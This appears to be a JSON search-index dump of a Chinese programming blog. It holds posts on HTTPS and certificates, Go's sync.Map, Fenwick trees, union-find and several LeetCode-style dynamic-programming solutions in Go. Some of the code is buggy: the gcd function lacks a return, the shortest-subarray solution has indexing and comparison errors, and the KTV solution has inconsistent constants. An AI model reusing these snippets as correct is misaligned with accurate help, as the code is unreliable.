也就是即便有人截取服务器A证书，再发给客户端，想冒充服务器A，也无法实现。因为证书和url的域名是绑定的。 CA的作用 颁发证书，颁发证书其实就是使用CA的私钥对证书请求签名文件进行签名 颁发的证书浏览器要信任，浏览器只需要用CA的公钥进行验签成功就表示这个证书是合法可信的，这就需要浏览器内置CA的公钥，也就是内置CA的证书。一般来说，操作系统都会内置权威CA的证书，有的浏览器会使用操作系统内置的CA证书列表，有的浏览器则自己维护的CA证书列表，比如Firefox HTTP通信存在的问题 被监听： 被伪装 呗篡改 两种加密方式 共享密钥加密 共享密钥的加密密钥和解密密钥是相同的，所以又称为对称密钥 公开密钥加密 加密算法是公开的，密钥是保密的。公开密钥分为私有密钥和公有密钥，公有密钥是公开的，任何人(客户端)都可以获取，客户端使用公有密钥加密数据，服务端用私有密钥解密数据。 异同 共享密钥加密与公开密钥加密相比，加解密处理速度快，但公开密钥更适应互联网下使用 httpshttps很好的解决了http的三个缺点（被监听、被篡改、被伪装），https不是一种新的协议，它是http+SSL(TLS)的结合体，SSL是一种独立协议，所以其它协议比如smtp等也可以跟ssl结合。https改变了通信方式，它由以前的http—–&gt;tcp，改为http——&gt;SSL—–&gt;tcp；https采用了共享密钥加密+公开密钥加密的方式 防监听 数据是加密的，所以监听得到的数据是密文，hacker看不懂。 防伪装 伪装分为客户端伪装和服务器伪装，通信双方携带证书，证书相当于身份证，有证书就认为合法，没有证书就认为非法，证书由第三方颁布，很难伪造 防篡改 https对数据做了摘要，篡改数据会被感知到。hacker即使从中改了数据也白搭。 如何建立https连接？ 客户端发送请求到服务器端 服务器端返回证书和公钥，公钥作为证书的一部分而存在 客户端验证证书和公钥的有效性，如果有效，则生成共享密钥并使用公钥加密发送到服务器端 服务器端使用私钥解密数据，并使用收到的共享密钥加密数据，发送到客户端 客户端使用共享密钥解密数据 SSL加密建立………","categories":[{"name":"面经","slug":"面经","permalink":"https://github.com/z-anshun/categories/%E9%9D%A2%E7%BB%8F/"}],"tags":[{"name":"https","slug":"https","permalink":"https://github.com/z-anshun/tags/https/"}]},{"title":"最大公约数","slug":"gcb","date":"2021-12-13T07:48:17.000Z","updated":"2021-12-13T08:10:16.701Z","comments":true,"path":"2021/12/13/gcb/","link":"","permalink":"https://github.com/z-anshun/2021/12/13/gcb/","excerpt":"","text":"最大公约数即为 Greatest Common Divisor，常缩写为 gcd 欧几里得算法$$若x=cn,y=cm，c为最大公约数\\那么当x&gt;y时，即n&gt;m时\\令x=yk+j,那么j=x\\pmod y \\而j=x-yk=c*(n-m*k)\\也就是j和y的最大公约数也为c$$那么 gcd(x,y) = gcd(y,x%y) 代码实现 func gcd(x,y int)int{ if y==0{ return x } gcd(y,x%y) } 时间复杂度为O(lgn)","categories":[{"name":"算法","slug":"算法","permalink":"https://github.com/z-anshun/categories/%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"算法","slug":"算法","permalink":"https://github.com/z-anshun/tags/%E7%AE%97%E6%B3%95/"}]},{"title":"和至少为 K 的最短子数组","slug":"和至少为 K 的最短子数组","date":"2021-12-12T07:45:32.000Z","updated":"2022-02-02T09:53:18.660Z","comments":true,"path":"2021/12/12/he-zhi-shao-wei-k-de-zui-duan-zi-shu-zu/","link":"","permalink":"https://github.com/z-anshun/2021/12/12/he-zhi-shao-wei-k-de-zui-duan-zi-shu-zu/","excerpt":"","text":"题目：给你一个整数数组 nums 和一个整数 k ，找出 nums 中和至少为 k 的 最短非空子数组 ，并返回该子数组的长度。如果不存在这样的 子数组 ，返回 -1 。 子数组 是数组中 连续 的一部分。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/shortest-subarray-with-sum-at-least-k 示例： 输入：nums = [1], k = 1 输出：1 分析： 若，nums[i+1]+...+nums[j] &gt;= k 那么令，A[i]=nums[0]+nums[i]+...+nums[i]，即前缀合，也就是A[j]-A[i] &gt;=k 那么只需将A遍历即可 如： for i:=0;i&lt;n;i++{ for j:=i-1;j&gt;=0;j--{ if A[i]-A[j]&gt;=k&amp;&amp;i-j&lt;res{ res=i-j } } } 但是，时间复杂度为O(n^2) 优化 我们可以发现，A[j]-A[i] = A[j]-A[m]+(A[m]-A[i])，也就是当前若A[j]-A[m]&gt;=k,那么A[j]-A[i]&gt;=k，即，当前可以判断i++的循环下，最小的窗口长度 for i:=0;i&lt;n;i++{ for len(queue)!=0{ l:=queue[0] // 若i~l的合大于k，队头就出队列 // 因为若A[i]-A[l]&gt;=k，那么A[i+1]-A[l]&gt;=k就满足，即不需要再判断以l为左边界 if A[i]-A[l]&gt;=k{ res=min(i-l) queue=queue[1:] }else{ // 反之就退出 break } } queue=append(queue,i) } 但是，出错，因为若m&lt;i,有可能A[m]&gt;A[i]，也就是A[i]-A[m] &lt; 0, 那么A[j]-A[i]&gt;=k的前提下，A[j]-A[i-m]=A[j]-A[i]+(A[i]-A[m])&gt;=k，m大于0便不成立， 即，A[j]-A[m]&lt;k,但是A[j]-A[i]&gt;=k,其中i&gt;m，但在上诉代码中，其m下标可能因为A[j]-A[m]&lt;k而不会被退出，进而无法遍历到A[j]-A[i] 那么，我们可以通过改变queue中的下标，使其拥有的A[i]-A[queue[n]]&gt;=k，那么A[i]-A[quque[n-1]]&gt;=k一定成立，即i与queue中相减的每一段一定为正数 for i:=0;i&lt;n;i++{ // 确保A[i]-A[queue[n]]&gt;=k时，A[i]-A[quque[n-1]]&gt;=k成立， // 即 A[queue[n]]-A[queue[n-1]]&gt;0 for len(queue)!=0&amp;&amp;A[i]-A[queue[len(queue)-1]]&lt;0{ quque=queue[:len(queue)-1] } for len(queue)!=0{ l:=queue[0] if A[i]-A[l]&gt;=k{ res=min(i-l) queue=queue[1:] }else{ break } } queue=append(queue,i) } 整体代码实现 func shortestSubarray(nums []int, k int) int { n := len(nums) if n == 0 { return -1 } res := n + 1 A := make([]int, n+1) // 前缀合 A[0] = nums[0] for i := 1; i &lt;= n; i++ { A[i] = nums[i] + A[i-1] if A[i] &gt;= k { return 1 } } var queue []int for i := 0; i &lt;= n; i++ { for len(queue) != 0 &amp;&amp; A[i] &lt;= A[queue[len(queue)-1]] { queue = queue[:len(queue)-1] } for len(queue) != 0 &amp;&amp; A[i]-queue[0] &gt;= k { if res &gt; i-queue[0] { res = i - queue[0] } queue = queue[1:] } queue = append(queue, i) } if res==n+1{ return -1 } return res }","categories":[{"name":"算法","slug":"算法","permalink":"https://github.com/z-anshun/categories/%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"动态窗口","slug":"动态窗口","permalink":"https://github.com/z-anshun/tags/%E5%8A%A8%E6%80%81%E7%AA%97%E5%8F%A3/"}]},{"title":"sync.Map原理","slug":"sync.Map原理","date":"2021-12-06T04:03:53.000Z","updated":"2021-12-06T14:53:09.567Z","comments":true,"path":"2021/12/06/sync.map-yuan-li/","link":"","permalink":"https://github.com/z-anshun/2021/12/06/sync.map-yuan-li/","excerpt":"","text":"数据结构Map type Map struct{ // 加锁保护，用于dirty字段 mu Mutex // 只读数据，实际类型为readOnly，为原子操作 read atomic.Value // 原子操作实现的值 // 最新写入的数据 dirty map[interface{}]*entry // 记录新写入的数据，便于刷新 misses int } readOnly type readOnly struct{ // 内部的map m map[interface{}]*entry // ditry中是否含有read中没有的 amended bool } entry // 标记从dirty中删除的 var expunged = unsafe.Pointer(new(interface{})) // 存储值的指针 type entry struct{ p unsafe.Pointer // 等同于*interface } p == nil：键值被删除，且m.dirty == nil，即木有新写入的数据 p == expunged：键值已被删除，但m.dirty != nil 且 m.dirty 不存在该键值（expunged 实际是空接口指针） 反之，则键值对存在，存在于 m.read.m 中，如果 m.dirty!=nil 则也存在于 m.dirty 方法解析Load func (m *Map) Load(key interface{}) (value interface{}, ok bool) { read,_ := m.read.Load().(readOnly) e,ok := read.m[key] // read中没有，但dirty中有 if !ok&amp;&amp;read.amended{ m.mu.Lock() // 由于上面 read 获取没有加锁，为了安全再检查一次 read,_ := m.read.Load().(readOnly) e,ok := read.m[key] // 确实不存在 if !ok&amp;&amp;read.amended{ e,ok = m.dirty[key] // 调用miss m.missLocked() } m.mu.Unlock() } if !ok{ return nil,false } return e.load() } func (e *enrty)load()(value interface{},ok bool){ // 导出对应的指针的值，类似*ptr p := atomic.LoadPointer(&amp;e.p) if p==nil || p == expunged{ return nil,false } return *(*interface{})(p),true } func (m *Map) missLocked() { m.misses++ if m.misses &lt; len(m.dirty) { return } // 当 miss 积累过多，会将 dirty 存入 read，然后 将 amended = false，且 m.dirty = nil m.read.Store(readOnly{m: m.dirty}) m.dirty = nil m.misses = 0 } Store func (m *Map) Store(key, value interface{}) { read, _ := m.read.Load().(readOnly) // 如果当前值存在，就尝试覆盖 if e, ok := read.m[key]; ok &amp;&amp; e.tryStore(&amp;value) { return } m.mu.Lock() // 加锁后，进行读取 read,_ = m.read.Load().(readOnly) // 情况1：read里存在 if e, ok := read.m[key]; ok { if e.unexpungeLocked() { // 如果当前值已经删除，则先更新dirty m.dirty[key] = e } // 无条件存储 e.storeLocked(&amp;value) }else if e, ok := m.dirty[key]; ok { // 情况2:如果dirty中存在 e.storeLocked(&amp;value) // 只更改dirty即可，后面会更新read }else{ // 情况3:read和dirty中都没有 if !read.amended{ // dirty中跟read已经合并，即已经更新脏表，即现在read数据比dirty多 // 调用 dirtyLocked 将 read 拷贝到 dirty（除了被标记删除的数据） m.dirtyLocked() // 保存新的read m.read.Store(readOnly{m: read.m, amended: true}) } // 如果dirty中还有read里没有的 m.dirty[key] = newEntry(value)// 直接写入 } m.mu.Unlock() } func newEntry(i interface{}) *entry { return &amp;entry{p: unsafe.Pointer(&amp;i)} } // 比较当前指针是否为expunged func (e *entry) unexpungeLocked() (wasExpunged bool) { return atomic.CompareAndSwapPointer(&amp;e.p, expunged, nil) } func (e *entry) storeLocked(i *interface{}) { atomic.StorePointer(&amp;e.p, unsafe.Pointer(i)) } func (e *entry) tryStore(i *interface{}) bool { for { p := atomic.LoadPointer(&amp;e.p) if p == expunged { return false } // 比较并交换到指定位置 if atomic.CompareAndSwapPointer(&amp;e.p, p, unsafe.Pointer(i)) { return true } } } func (m *Map) dirtyLocked() { // 如果脏表还有数据，返回 if m.dirty != nil { return } read, _ := m.read.Load().(readOnly) m.dirty = make(map[interface{}]*entry, len(read.m)) for k, e := range read.m { // 尝试对read中的数据清除失败 if !e.tryExpungeLocked() { m.dirty[k] = e // 放入dirty中 } } } // 尝试对e写入expunged func (e *entry) tryExpungeLocked() (isExpunged bool) { p := atomic.LoadPointer(&amp;e.p) for p == nil { if atomic.CompareAndSwapPointer(&amp;e.p, nil, expunged) { return true } p = atomic.LoadPointer(&amp;e.p) } return p == expunged } Delete func (m *Map)Delete(key interface{}){ m.LoadAndDelete(key) } func (m *Map) LoadAndDelete(key interface{}) (value interface{}, loaded bool) { read, _ := m.read.Load().(readOnly) e, ok := read.m[key] if !ok &amp;&amp; read.amended { m.mu.Lock() read, _ = m.read.Load().(readOnly) e, ok = read.m[key] // 老规矩，如果read中没有，dirty中还有read中没有的 if !ok &amp;&amp; read.amended { e, ok = m.dirty[key] m.missLocked() } m.mu.Unlock() } // 如果有 if ok { return e.delete() } return nil, false } func (e *entry) delete() (value interface{}, ok bool) { for { // 导出指针，便于返回 p := atomic.LoadPointer(&amp;e.p) if p == nil || p == expunged { return nil, false } // f if atomic.CompareAndSwapPointer(&amp;e.p, p, nil) { return *(*interface{})(p), true } } }","categories":[{"name":"学习","slug":"学习","permalink":"https://github.com/z-anshun/categories/%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"Golang","slug":"Golang","permalink":"https://github.com/z-anshun/tags/Golang/"}]},{"title":"树状数组","slug":"树状数组","date":"2021-10-21T14:24:17.000Z","updated":"2021-10-21T14:24:56.019Z","comments":true,"path":"2021/10/21/shu-zhuang-shu-zu/","link":"","permalink":"https://github.com/z-anshun/2021/10/21/shu-zhuang-shu-zu/","excerpt":"","text":"简介线状数组类是线段树，但是却又不同，其对于节点的更改，和查找集合是十分方便的 原理假设，我们当前的数组为a，构成的线状数组为c 那么 即： c[1]=a[1] c[2]=a[1]+a[2] c[3]=a[3] c[4]=a[1]+a[2]+a[3]+a[4] c[5]=a[5] c[6]=a[5]+a[6] c[7]=a[7] c[8]=a[1]+a[2]+a[3]+a[4]+a[5]+a[6]+a[7] 我们换一个角度观察： c[0001]=a[1] c[0010]=a[1]+a[2] c[0011]=a[3] c[0100]=a[1]+a[2]+a[3]+a[4] c[01001]=a[5] c[0110]=a[5]+a[6] c[0111]=a[7] c[1000]=a[1]+a[2]+a[3]+a[4]+a[5]+a[6]+a[7]+a[8] 也就是:$$c[i]=a[i-2^k+1]+ … + a[i]\\k为i的二进制中末尾连续0的个数$$如：i=8时，k=3,则：c[1000]=a[1]+a[2]+a[3]+a[4]+a[5]+a[6]+a[7]+a[8] 求和很明显 sum[5]=a[1]+a[2]+a[3]+a[4]+a[5] 也就是 sum[5]=c[4]+c[5] 即：sum[101]=c[100]+c[101] 也就是当前的sum为每次去除二进制i后末尾的1，直到为0的合 代码展示 // 取出最低位的1 func lowbit(i int) int { // 比如：6 = 0110 // -6 = 1001+1 = 1010 // 6&amp;(-6) = 0010 = 2 return i &amp; (-i) } // 求和 // sum(7) = a[1]+a[2]+a[3]+a[4]+a[5]+a[6]+a[7] // c[4] = a[1] + a[2] + a[3] + a[4]；c[6] = a[5] + a[6] ; c[7] = a[7] // sum(7) = c[4] + c[6] + c[7] // 即：sum(111) = c[100] + c[110] + c[111] func getSum(x int, c []int) int { sum := 0 // 每次减去末尾的1 for i := x; i &gt; 0; i -= lowbit(i) { sum += c[i] } return sum } 查询跟求和类似，直接上代码 // 下标为x的增加y // 如 x = 1 = 0001 ；c[1],c[2],c[4],c[8]则需要更新 // 即：0001、0010、0100、1000 // 更新即查询的逆过程 func add(x, y int, c []int) { for i := x; i &lt; len(c); i += lowbit(i) { c[i] += y } } 整体代码// c[i] = a[i-2^k+1] + ... + a[i] // k 为i的二进制下末尾连续的0的个数 // 如：c[6] = a[5] + a[6] 6 = 0110 k = 1 // 取出最低位的1 func lowbit(i int) int { // 比如：6 = 0110 // -6 = 1001+1 = 1010 // 6&amp;(-6) = 0010 = 2 return i &amp; (-i) } // 求和 // sum(7) = a[1]+a[2]+a[3]+a[4]+a[5]+a[6]+a[7] // c[4] = a[1] + a[2] + a[3] + a[4]；c[6] = a[5] + a[6] ; c[7] = a[7] // sum(7) = c[4] + c[6] + c[7] // 即：sum(111) = c[100] + c[110] + c[111] func getSum(x int, c []int) int { sum := 0 // 每次减去末尾的1 for i := x; i &gt; 0; i -= lowbit(i) { sum += c[i] } return sum } // 下标为x的增加y // 如 x = 1 = 0001 ；c[1],c[2],c[4],c[8]则需要更新 // 即：0001、0010、0100、1000 // 更新即查询的逆过程 func add(x, y int, c []int) { for i := x; i &lt; len(c); i += lowbit(i) { c[i] += y } } func created(arr []int) []int { n := len(arr) c := make([]int, n) for i := 0; i &lt; n; i++ { // 跟更新类似 c[i] += arr[i] j := i + lowbit(i) // 更新其父节点 if j &lt; n { c[j] += c[i] } } return c } 例题： 在数组中的两个数字，如果前面一个数字大于后面的数字，则这两个数字组成一个逆序对。输入一个数组，求出这个数组中的逆序对的总数。 示例 1: 输入: [7,5,6,4]输出: 5 限制： 0 &lt;= 数组长度 &lt;= 50000 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/shu-zu-zhong-de-ni-xu-dui-lcof func reversePairs(nums []int) int { n := len(nums) tmp := make([]int, n) copy(tmp, nums) sort.Ints(tmp) // 排序 for i := 0; i &lt; n; i++ { // nums = {3,4,2} // 如，tmp={2,3,4} // nums = {2,3,1} nums[i] = sort.SearchInts(tmp, nums[i]) + 1 // 找到对应的下标 +1 } bit := BIT{n: n, tree: make([]int, n+1)} ans := 0 // 从后往前遍历. 现在nums为排序后的对应的index for i := n - 1; i &gt;= 0; i-- { ans += bit.query(nums[i] - 1) bit.update(nums[i]) } return ans } type BIT struct { n int tree []int } func (b BIT) lowbit(x int) int { return x &amp; (-x) } func (b BIT) query(x int) int { ret := 0 for x &gt; 0 { ret += b.tree[x] x -= b.lowbit(x) } return ret } // 对应的+1 // 这里可能会很大 func (b BIT) update(x int) { for x &lt;= b.n { b.tree[x]++ x += b.lowbit(x) } }","categories":[{"name":"算法","slug":"算法","permalink":"https://github.com/z-anshun/categories/%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"树状数组","slug":"树状数组","permalink":"https://github.com/z-anshun/tags/%E6%A0%91%E7%8A%B6%E6%95%B0%E7%BB%84/"}]},{"title":"最多牌组数","slug":"最多牌组数","date":"2021-10-09T10:13:45.000Z","updated":"2021-10-09T10:14:03.638Z","comments":true,"path":"2021/10/09/zui-duo-pai-zu-shu/","link":"","permalink":"https://github.com/z-anshun/2021/10/09/zui-duo-pai-zu-shu/","excerpt":"","text":"题目：麻将的游戏规则中，共有两种方式凑成「一组牌」： 顺子：三张牌面数字连续的麻将，例如 [4,5,6]刻子：三张牌面数字相同的麻将，例如 [10,10,10]给定若干数字作为麻将牌的数值（记作一维数组 tiles），请返回所给 tiles 最多可组成的牌组数。 注意：凑成牌组时，每张牌仅能使用一次。 示例 1： 输入：tiles = [2,2,2,3,4] 输出：1 解释：最多可以组合出 [2,2,2] 或者 [2,3,4] 其中一组牌 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/Up5XYM 分析： 首先，我们如果拿到一组牌，如 1112223344，那么它可以组成111、234、234时为最多的牌组数，若是11122233最多即为111、222 也就是，当4算进来的时候，我们需要判断讲它与前面相连能否得到最多的集合 那么，我们假设当前计算的末尾为i时，设其有t张，i-2有x张，i-1有y张，dp[m][n]表示当留下剩余i-1的m张,i的n张时的集合数，shunzi为当前需要的顺子数（0 &lt;= shunzi &lt;= min{m,min{n,cnt}}） 那么当前的集合数为：$$new_score= shunzi + dp[m_{i-2}][n_{i-1}] + (t-shunzi-n_i)/3\\$$ $$dp[m_{i-1}][n_i]=max{dp[m_{i-1}][n_i],new_score}$$ 算法实现： func maxGroupNumber(tiles []int) int { count := make(map[int]int) // 记录每张牌的数量 for _, tile := range tiles { count[tile]++ } var ks []int for i, _ := range count { ks = append(ks, i) } sort.Slice(ks, func(i, j int) bool { return ks[i] &lt; ks[j] }) var dp [5][5]int // 表示预留x张t-2，y张t-1的时候 当前能组成的牌组 for i, ints := range dp { for i2, _ := range ints { dp[i][i2] = -1 } } dp[0][0] = 0 pre_tile := 0 // 当前牌的前一张的点数 for _, i := range ks { cnt := count[i] // 如果不连续 if pre_tile != i-1 { dp00 := dp[0][0] // i-2 和 i-1 留下的牌数都为0，即使当前若不留牌的集合数 // 重新来过 for i1, ints := range dp { for i2, _ := range ints { dp[i1][i2] = -1 } } dp[0][0] = dp00 } var new_dp [5][5]int for i1, ints := range new_dp { for i2, _ := range ints { new_dp[i1][i2] = -1 } } for cnt_2 := 0; cnt_2 &lt; 5; cnt_2++ { // cnt-2 的牌数 for cnt_1 := 0; cnt_1 &lt; 5; cnt_1++ { // 对应没那么多 if dp[cnt_2][cnt_1] &lt; 0 { continue } // 如果有满足，即使当 dp00时候 // 假设当顺子为shunzi。你们下一个new_2 = cnt_1 - shunzi; new_1 = cnt - shunzi for shunzi := 0; shunzi &lt;= min(cnt_1, min(cnt_2, cnt)); shunzi++ { new_2 := cnt_1 - shunzi // 下一个的t-2，就是这个的t-1 // 新的t-1的范围为4和当前 cnt 减去被连续用剩下的 for new_1 := 0; new_1 &lt;= min(4, cnt-shunzi); new_1++ { new_score := dp[cnt_2][cnt_1] + shunzi + (cnt-shunzi-new_1)/3 new_dp[new_2][new_1] = max(new_dp[new_2][new_1], new_score) } } } } dp = new_dp pre_tile = i } ans := 0 for cnt_2 := 0; cnt_2 &lt; 5; cnt_2++ { for cnt_1 := 0; cnt_1 &lt; 5; cnt_1++ { ans = max(ans, dp[cnt_2][cnt_1]) } } return ans } func min(x, y int) int { if x &lt; y { return x } return y } func max(x, y int) int { if x &gt; y { return x } return y }","categories":[{"name":"算法","slug":"算法","permalink":"https://github.com/z-anshun/categories/%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"动归","slug":"动归","permalink":"https://github.com/z-anshun/tags/%E5%8A%A8%E5%BD%92/"}]},{"title":"最低加油次数","slug":"最低加油次数","date":"2021-10-09T10:12:46.000Z","updated":"2021-10-09T10:13:13.471Z","comments":true,"path":"2021/10/09/zui-di-jia-you-ci-shu/","link":"","permalink":"https://github.com/z-anshun/2021/10/09/zui-di-jia-you-ci-shu/","excerpt":"","text":"题目：汽车从起点出发驶向目的地，该目的地位于出发位置东面 target 英里处。 沿途有加油站，每个 station[i] 代表一个加油站，它位于出发位置东面 station[i][0] 英里处，并且有 station[i][1] 升汽油。 假设汽车油箱的容量是无限的，其中最初有 startFuel 升燃料。它每行驶 1 英里就会用掉 1 升汽油。 当汽车到达加油站时，它可能停下来加油，将所有汽油从加油站转移到汽车中。 为了到达目的地，汽车所必要的最低加油次数是多少？如果无法到达目的地，则返回 -1 。 注意：如果汽车到达加油站时剩余燃料为 0，它仍然可以在那里加油。如果汽车到达目的地时剩余燃料为 0，仍然认为它已经到达目的地。 示例 1： 输入：target = 1, startFuel = 1, stations = []输出：0解释：我们可以在不加油的情况下到达目的地。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/minimum-number-of-refueling-stops 解法1：DP 解析：假设我们当前加油了i次，当前最远距离为s，如： target = 100, startFuel = 10, stations = [[10,60],[20,30],[30,30],[60,40]] 那么，我们只加油1次，那么最远就可以跑 10 + 60 = 70 如果两次 ，那么就是 10 + 60 + 40 =110 那么，令dp[i]为加油i次可以到达的最远距离，s为新加入加油站的油$$dp[i]=max{dp[i],dp[i]+s}$$代码实现： func minRefuelStops(target int, startFuel int, stations [][]int) int { dp := make([]int, len(stations)+1) dp[0] = startFuel // 遍历到达每个节点 for i, station := range stations { // 当前最多能加i次 // dp[i+1]=max(dp[i+1],dp[i]+s) // 这里只能是从后往前， // 因为当前加入i这个站点后，如果从前面往后，就会导致这个点多次用，改变dp[i] for k := i; k &gt;= 0; k-- { // 当前加这么多次能到达，就表示可以选择这个加油站 if dp[k] &gt;= station[0] { dp[k+1] = max(dp[k+1], dp[k]+station[1]) } } } for i, v := range dp { if v &gt;= target { return i } } return -1 } func max(x, y int) int { if x &gt; y { return x } return y } 解法2：最大堆+贪心 解析：假设我们期望到达下一个站点，那么有可能当前的油能够到达或者不能到达，如果不能到达，那么我们就需要在前面路过时的站点能加最多油的进行加油，直到能够到达，如果每个站点都加过了还是无法到达，就返回-1 代码实现： func minRefuelStops(target int, startFuel int, stations [][]int) int { var qp []int res := 0 nowTank := startFuel for _, station := range stations { if nowTank &lt; station[0] { // 选多个路过的站加 if len(qp) == 0 { return -1 } c:=0 for r:=0;r&lt;len(qp);r++{ nowTank += qp[r] res++ c++ if nowTank&gt;=station[0]{ break } } qp=qp[c:] } if nowTank &gt;= station[0] { qp = append(qp, station[1]) sort.Slice(qp, func(i, j int) bool { return qp[i] &gt; qp[j] }) } else { return -1 } } if nowTank &gt;= target { return res } for i := 0; i &lt; len(qp); i++ { nowTank += qp[i] res++ if target &lt;= nowTank { return res } } return -1 }","categories":[{"name":"算法","slug":"算法","permalink":"https://github.com/z-anshun/categories/%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"动归","slug":"动归","permalink":"https://github.com/z-anshun/tags/%E5%8A%A8%E5%BD%92/"}]},{"title":"劲爆金曲","slug":"劲爆金曲","date":"2021-10-01T10:21:43.000Z","updated":"2021-10-09T10:13:19.232Z","comments":true,"path":"2021/10/01/jing-bao-jin-qu/","link":"","permalink":"https://github.com/z-anshun/2021/10/01/jing-bao-jin-qu/","excerpt":"","text":"剩下n首歌，t秒时间，问最多能唱几首的前提下，最长时间 输出最多歌数和最长时间 思路： 典型的动归问题，假设我们现在要唱j秒，然后当我们新加入一首歌时，我们会判断能否加入。 如果加入那么最多能唱的歌数为j减去这首歌的时间内能最多唱的数量+1 如果不加入，那么就是未加入这首歌时，j秒内最多能唱的数量 因此，我们推出公式$$dp[i][j]=max{dp[i-1][j],dp[i-1][j-songs[i]]+1}$$上面i为第i首歌，j为时间，songs为每首歌对应的时长 代码实现： // KTV n首歌, 剩余t时间，songs为每首歌的时长 // 金曲的时长为687s func KTV(n, t int, songs []int) (int, int) { number := make([][]int, len(songs)+1) for k, _ := range number { number[k] = make([]int, t) } number[0][0] = 0 // 0首0s for i := 1; i &lt;= len(songs); i++ { for j := 0; j &lt; t; j++ { number[i][j] = number[i-1][j] if j &gt;= songs[i] { // 当前的j满足唱这首歌,确保指针不为负 number[i][j] = max(number[i][j], number[i-1][j-songs[i]]+1) } } } } 上面的代码实现了number的初始化，那么最长歌数一定是在number[n]数组里面，那么最长时间呢？ 因为number[i][j]表示的为j秒内最多可唱的歌，也就是当j1&gt;j2时，那么number[i][j1]&gt;=number[i][j2]，因此我们无法知道这个j是否为唱这么多首歌所需的时间 解决思路： 我们期望的时间肯定为t-1，那么，我们遍历每一首歌，如果当前这一首能唱，并且满足number中在唱这首歌后刚好为当前歌数-1，那么就代表能选择这首 代码实现： func total_time(t, n int, songs []int, number [][]int) int { // 当前剩下的时间t,总的时间 for i := 0; i &lt; n; i++ { if t &gt;= songs[i] &amp;&amp; number[i][t] == number[i][t-songs[i]]+1 { return songs[i] + total_time(t-songs[i], n, songs, number) } } return 0 } 总代码实现： // KTV n首歌, 剩余t时间，songs为每首歌的时长 // 金曲的时长为687s func KTV(n, t int, songs []int) (int, int) { number := make([][]int, len(songs)+1) for k, _ := range number { number[k] = make([]int, t) } number[0][0] = 0 // 0首0s for i := 1; i &lt;= len(songs); i++ { for j := 0; j &lt; t; j++ { number[i][j] = number[i-1][j] if j &gt;= songs[i] { // 当前的j满足唱这首歌,确保指针不为负 number[i][j] = max(number[i][j], number[i-1][j-songs[i]]+1) } } } ans := total_time(t-1, n, songs, number) return number[n][ans] + 1, ans + 678 // 最长时间，最多歌曲 } func total_time(t, n int, songs []int, number [][]int) int { // 当前剩下的时间t,总的时间 for i := 0; i &lt; n; i++ { if t &gt;= songs[i] &amp;&amp; number[i][t] == number[i][t-songs[i]]+1 { return songs[i] + total_time(t-songs[i], n, songs, number) } } return 0 } func max(x, y int) int { if x &gt; y { return x } return y }","categories":[{"name":"算法","slug":"算法","permalink":"https://github.com/z-anshun/categories/%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"动归","slug":"动归","permalink":"https://github.com/z-anshun/tags/%E5%8A%A8%E5%BD%92/"}]},{"title":"并查集","slug":"并查集","date":"2021-09-30T15:08:29.000Z","updated":"2021-09-30T15:09:04.936Z","comments":true,"path":"2021/09/30/bing-cha-ji/","link":"","permalink":"https://github.com/z-anshun/2021/09/30/bing-cha-ji/","excerpt":"","text":"对于一组数据，当要求我们检查某两个数据是否在同一集合内时，就需要并查集去实现了 如：&lt;a,b&gt;,&lt;b,c&gt;，那么很明显a、b、c都在同一集合内 实现思路： 如果我们先将输入的a、b指向自己，再将a指向b，即a令父亲为b 那么： 当我们再输入b，c后，跟上面一样的操作： 很明显，我们就可以通过a，b，c是否拥有统一父亲确定是否为同集合了 理解这个思路很简单，那么代码如何实现？ 首先，设置两个map进行数据的存储 var fa map[int]int // 父节点 var cnt map[int]int // 子节点数量 我们需要一个函数来进行查找，某个点的父亲 func find(x int) int { i, ok := fa[x] if !ok { // 如果没有 fa[x] = x cnt[x] = 0 return x } // 当前节点为父节点 if i == x { return x } else { // 不是父节点，继续寻找 fa[x] = find(fa[x]) return fa[x] } } 有了寻找父节点的函数后，其联合，便简单了，只需要将一个节点的父亲设置为另一个节点父亲的父亲节点 // 联合 func Union(x, y int) { fx := find(x) fy := find(y) fa[fx] = fy // x的父亲的父亲就是y的父亲, } 例题： 现在有107个用户，编号为1- 107，现在已知有m对关系，每一对关系给你两个数x和y，代表编号为x的用户和编号为y的用户是在一个圈子中，例如：A和B在一个圈子中，B和C在一个圈子中，那么A,B,C就在一个圈子中。现在想知道最多的一个圈子内有多少个用户。 链接：https://www.nowcoder.com/questionTerminal/11ee0516a988421abf40b315a2b28d08来源：牛客网 代码实现 package dom07 import \"fmt\" var fa map[int]int // 父节点 var cnt map[int]int // 子节点数量 func find(x int) int { i, ok := fa[x] if !ok { // 如果没有 fa[x] = x cnt[x] = 0 return x } // 当前节点为父节点 if i == x { return x } else { // 不是父节点，继续寻找 fa[x] = find(fa[x]) return fa[x] } } // 联合 func Union(x, y int) { fx := find(x) fy := find(y) fa[fx] = fy // x的父亲的父亲就是y的父亲, } func main() { for { t := 0 _, err := fmt.Scanf(\"%d\", &amp;t) if err != nil { return } for i := 0; i &lt; t; i++ { n := 0 fmt.Scanf(\"%d\", &amp;n) fa = make(map[int]int) cnt = make(map[int]int) max := 0 for j := 0; j &lt; n; j++ { var x, y int fmt.Scanf(\"%d %d\", &amp;x, &amp;y) Union(x,y) } for vk, _:= range fa { fi:=find(vk) cnt[fi]++ if cnt[fi]&gt;max{ max=cnt[fi] } } fmt.Println(max) } } }","categories":[{"name":"算法","slug":"算法","permalink":"https://github.com/z-anshun/categories/%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"算法","slug":"算法","permalink":"https://github.com/z-anshun/tags/%E7%AE%97%E6%B3%95/"}]},{"title":"Manacher","slug":"Manacher","date":"2021-09-27T14:56:33.000Z","updated":"2021-10-03T16:34:36.889Z","comments":true,"path":"2021/09/27/manacher/","link":"","permalink":"https://github.com/z-anshun/2021/09/27/manacher/","excerpt":"","text":"题目：给定一段字符串，求该其最长的回文子串 主要思路： 我们创建一个将目标字符穿进行扩充，然后使用#进行填充，并在前后分别添加^和$方便后续操作 再创建一个数组T记录当前节点的半径 